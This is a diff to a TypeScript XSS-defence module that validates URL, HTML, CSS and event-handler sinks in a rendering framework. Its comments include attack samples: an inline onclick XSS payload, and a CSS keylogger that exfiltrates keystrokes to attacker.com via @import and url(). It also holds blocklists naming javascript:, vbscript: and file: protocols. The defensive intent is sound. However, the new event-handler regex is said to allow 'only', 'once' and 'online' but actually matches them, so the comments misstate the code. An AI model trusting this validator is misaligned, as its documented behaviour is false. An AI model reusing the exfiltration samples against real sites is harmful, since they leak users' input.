@@ -1,5 +1,5 @@
 /**
- * REFLEX SECURITY KERNEL
+ * REFLEX SECURITY KERNEL v6.0 ("Zero Trust")
  *
  * Centralized "Sink-Based Security" - the final firewall for all rendering targets.
  * This module defines strict validation rules for DOM/Native sinks and acts as
@@ -9,10 +9,34 @@
  * - Native (App) - VirtualRenderer
  * - Compiled (AOT) - Generated code via DOMRenderer
  *
- * SECURITY MODEL:
- * 1. URL Injection Sinks (Type 1): Block javascript: protocol
+ * === THE TRIFECTA SECURITY MODEL ===
+ *
+ * 1. URL Injection Sinks (Type 1): ALLOWLIST-based protocol validation
+ *    - v6 UPGRADE: Switched from blocklist to allowlist
+ *    - ALLOWS: http, https, mailto, tel, sms, ftp, relative URLs, data:image/*
+ *    - BLOCKS: Everything else (javascript:, vbscript:, file:, ms-settings:, etc.)
+ *
  * 2. Code Injection Sinks (Type 2): Blocked unless SafeHTML instance
- * 3. CSS Sinks (Type 3): Block expression() and javascript: in url()
+ *    - innerHTML, outerHTML, srcdoc require SafeHTML wrapper
+ *
+ * 3. CSS Sinks (Type 3): Block dangerous patterns
+ *    - v6 UPGRADE: Added @import blocking for CSS exfiltration prevention
+ *    - BLOCKS: expression(), javascript: in url(), @import
+ *
+ * 4. Event Handler Sinks (Type 4): Pattern-based blocking
+ *    - v6 UPGRADE: Refined regex to fix false positives/negatives
+ *    - BLOCKS: onclick, on-click (Web Components), onload, etc.
+ *    - ALLOWS: only, once, online (common words)
+ *
+ * 5. Navigation/Target Sinks (Type 5): Tabnabbing & redirect protection
+ *    - v6 UPGRADE: Added formtarget to tabnabbing checks
+ *
+ * === ARCHITECTURAL PRINCIPLES ===
+ *
+ * 1. ALLOWLIST > BLOCKLIST: Unknown values are DENIED by default
+ * 2. DEFENSE IN DEPTH: Multiple validation layers at different trust boundaries
+ * 3. OBJECT COERCION: All values coerced to strings before validation
+ * 4. ZERO TRUST: Assume all input is malicious until proven safe
  *
  * CRITICAL FIX: Object Coercion XSS Prevention
  * Objects are coerced to strings BEFORE validation because:
@@ -22,12 +46,22 @@
  */
 
 import { SafeHTML } from './safe-html.js';
+import { SAFE_URL_RE, RELATIVE_URL_RE } from './symbols.js';
 
 // Control character regex for normalization (prevents evasion via \0, etc.)
 const CTRL = /[\u0000-\u001F\u007F-\u009F]/g;
 
-// Disallowed protocols for URL sinks
-const DISALLOWED_PROTOCOLS = /^javascript:/i;
+// DEPRECATED: Blocklist approach - kept for reference only
+// const DISALLOWED_PROTOCOLS = /^javascript:/i;
+//
+// v6 CRITICAL FIX (Issue #3): Protocol Smuggling Prevention
+// The blocklist approach is fundamentally flawed because:
+// - We only blocked 'javascript:' but allowed vbscript:, file:, etc.
+// - New protocols appear regularly (ms-settings:, git:, etc.)
+// - This is "Never Ending Patching" - a losing battle
+//
+// SOLUTION: Use ALLOWLIST from symbols.ts (SAFE_URL_RE, RELATIVE_URL_RE)
+// Only explicitly safe protocols are permitted: http, https, mailto, tel, sms, ftp
 
 // SECURITY FIX (Audit Issue #4): Data URI protocol detection
 // data: URIs are a primary vector for phishing attacks - an attacker can render
@@ -108,13 +142,22 @@ export const SINK_TYPES: { [key: string]: number } = {
  * The previous blacklist approach failed to enumerate event handlers, allowing:
  *   <div :onclick="'alert(XSS)'"></div>
  *
- * This pattern matches ALL event handlers:
- *   - Standard: onclick, onmouseover, onload, onerror, etc.
- *   - Custom: on-any-pattern (defensive against future browser additions)
+ * v6 CRITICAL FIX (Issue #5): Refined Event Handler Regex
+ * The old pattern /^on[a-z]/i had problems:
+ * - FALSE POSITIVES: Blocked valid attributes like 'only', 'once', 'online', 'ontology'
+ * - FALSE NEGATIVES: Didn't match 'on-click' (Web Components custom event syntax)
+ *
+ * NEW PATTERN: Matches "on" followed by either:
+ * - A lowercase letter then MORE characters (onclick, onload, onmouseover)
+ * - A hyphen then lowercase letter (on-click, on-save - Web Components)
+ *
+ * This accurately targets event handlers while allowing common words:
+ * - Blocks: onclick, on-save, onDOMContentLoaded, ONCLICK
+ * - Allows: only, once, online (single word, no more chars after 'on' + letter)
  *
  * The pattern is case-insensitive to prevent case-manipulation bypasses.
  */
-const EVENT_HANDLER_PATTERN = /^on[a-z]/i;
+const EVENT_HANDLER_PATTERN = /^on([a-z].+|-[a-z])/i;
 
 /**
  * Pattern to detect javascript: protocol in values.
@@ -260,24 +303,58 @@ export function validateSink(prop: string, value: any): boolean {
     return true;
   }
 
-  // TYPE 1: URL Sinks - Block javascript: and dangerous data: protocols
+  // TYPE 1: URL Sinks - ALLOWLIST-based protocol validation
+  //
+  // v6 CRITICAL FIX (Issue #3): Protocol Smuggling Prevention
+  // ARCHITECTURE CHANGE: Switched from BLOCKLIST to ALLOWLIST
+  //
+  // OLD (Blocklist - INSECURE):
+  //   if (DISALLOWED_PROTOCOLS.test(normalized)) return false;
+  //   Problem: Only blocked 'javascript:', missed vbscript:, file:, ms-settings:, etc.
+  //
+  // NEW (Allowlist - SECURE):
+  //   DENY everything that isn't explicitly safe
+  //   - Safe absolute URLs: http:, https:, mailto:, tel:, sms:, ftp:
+  //   - Safe relative URLs: /, ./, ../, #, ?, paths without colons
+  //   - Safe data URIs: data:image/* only (for legitimate image embedding)
+  //
   if (type === 1) {
-    if (DISALLOWED_PROTOCOLS.test(normalized)) {
-      return false;
+    // Allow safe protocols (http, https, mailto, tel, sms, ftp)
+    if (SAFE_URL_RE.test(normalized)) {
+      return true;
     }
 
-    // SECURITY FIX (Audit Issue #4): Block data: URI phishing
-    // data: URIs can render entire HTML pages for phishing attacks.
-    // Only allow data:image/* for legitimate image embedding.
-    if (DATA_PROTOCOL.test(normalized) && !DATA_IMAGE_PROTOCOL.test(normalized)) {
-      return false;
+    // Allow relative URLs (/, ./, ../, #anchor, ?query, paths without colons)
+    if (RELATIVE_URL_RE.test(normalized)) {
+      return true;
     }
 
-    return true;
+    // SECURITY FIX (Audit Issue #4): Allow only data:image/* for legitimate images
+    // Block all other data: URIs (they can render phishing pages)
+    if (DATA_IMAGE_PROTOCOL.test(normalized)) {
+      return true;
+    }
+
+    // DENY: Everything else (javascript:, vbscript:, file:, ms-settings:, etc.)
+    // This is the "Zero Trust" approach - unknown protocols are blocked by default
+    return false;
   }
 
   // TYPE 3: CSS Sinks - Block dangerous patterns
+  //
+  // v6 CRITICAL FIX (Issue #4, #6): CSS Exfiltration Prevention
+  // Added @import blocking - external stylesheets enable data exfiltration
+  // without JavaScript using CSS attribute selectors:
+  //   @import "http://attacker.com/keylogger.css";
+  //   /* keylogger.css: */
+  //   input[value^="a"] { background: url(http://attacker.com/log?char=a) }
+  //
   if (type === 3) {
+    // Block @import - enables external CSS loading for data exfiltration
+    if (/@import\s/i.test(normalized)) {
+      return false;
+    }
+
     // Block expression() (IE legacy) and javascript: inside url()
     if (DANGEROUS_CSS.test(normalized)) {
       return false;
@@ -359,20 +436,32 @@ export function getBlockReason(prop: string, value: any): string {
   const strValue = value != null ? String(value).replace(CTRL, '').trim() : '';
 
   if (type === 1) {
-    // Check specific protocol for better error message
-    if (DISALLOWED_PROTOCOLS.test(strValue)) {
-      return `Blocked javascript: protocol in URL sink '${prop}'`;
-    }
+    // v6: Allowlist-based - provide helpful error messages
     if (DATA_PROTOCOL.test(strValue) && !DATA_IMAGE_PROTOCOL.test(strValue)) {
       return `Blocked non-image data: URI in URL sink '${prop}'. Only data:image/* is allowed to prevent phishing.`;
     }
-    return `Blocked dangerous protocol in URL sink '${prop}'`;
+    // Check for common dangerous protocols to give specific feedback
+    if (/^javascript:/i.test(strValue)) {
+      return `Blocked javascript: protocol in URL sink '${prop}'. Use event handlers instead.`;
+    }
+    if (/^vbscript:/i.test(strValue)) {
+      return `Blocked vbscript: protocol in URL sink '${prop}'. Legacy scripting protocols are not allowed.`;
+    }
+    if (/^file:/i.test(strValue)) {
+      return `Blocked file: protocol in URL sink '${prop}'. Local file access is not allowed.`;
+    }
+    // Generic message for other blocked protocols
+    return `Blocked URL in sink '${prop}'. Only safe protocols (http, https, mailto, tel, sms, ftp) and relative URLs are allowed.`;
   }
   if (type === 2) {
     return `Blocked direct assignment to code injection sink '${prop}'. Use SafeHTML.sanitize() with m-html directive instead.`;
   }
   if (type === 3) {
-    return `Blocked dangerous CSS pattern in style sink '${prop}'`;
+    // v6: Added @import detection for better error messages
+    if (/@import\s/i.test(strValue)) {
+      return `Blocked @import in style sink '${prop}'. @import enables CSS-based data exfiltration.`;
+    }
+    return `Blocked dangerous CSS pattern in style sink '${prop}'. expression() and javascript: in url() are not allowed.`;
   }
   if (type === 5) {
     if (prop === 'form') {
